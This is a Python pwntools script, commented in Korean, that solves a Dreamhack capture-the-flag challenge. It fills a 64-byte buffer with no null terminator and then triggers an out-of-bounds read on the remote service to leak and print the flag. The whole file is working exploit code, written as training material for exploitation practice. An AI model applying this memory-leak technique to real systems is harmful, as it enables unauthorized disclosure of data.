from pwn import *

# 서버 정보 설정 (문제에 주어진 주소와 포트)
host = 'host8.dreamhack.games'
port = 23334

# 서버 연결
p = remote(host, port)

# 1. 파일 쓰기 (write file) - Null 바이트 없이 64바이트 꽉 채우기
p.sendlineafter(b'[*] input : ', b'2')
p.sendlineafter(b'Enter file contents : ', b'A' * 64)

# 2. 파일 읽기 (read file) - 플래그 메모리 로드 및 readbuffer 채우기
p.sendlineafter(b'[*] input : ', b'1')

# 3. 내용 출력 (show contents) - OOB Read 트리거
p.sendlineafter(b'[*] input : ', b'3')

# 4. 출력 결과에서 Flag 파싱하기
p.recvuntil(b'contents : ')
p.recv(64) # 우리가 입력한 쓰레기값 64바이트('A' * 64) 읽어내기
flag = p.recvline().strip().decode('utf-8')

print(f"\n[+] Flag Found: {flag}\n")

# 종료
p.sendlineafter(b'[*] input : ', b'4')
p.close()